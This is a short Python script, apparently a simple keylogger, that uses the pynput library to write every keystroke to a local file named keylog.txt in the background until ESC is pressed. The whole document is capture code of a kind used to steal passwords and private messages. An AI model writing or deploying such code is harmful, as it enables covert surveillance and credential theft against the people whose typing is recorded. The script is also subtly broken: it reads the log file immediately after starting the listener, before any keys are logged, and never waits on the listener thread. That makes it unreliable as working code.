from pynput import keyboard

log_file = "keylog.txt"  # The file where keystrokes will be saved

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)  # Normal key
    except:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")  # Special key like space, enter

def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

print("Keylogger started. Press ESC to stop it.")

listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()  # Start in background

with open("keylog.txt", "r") as f:
    print(f.read())
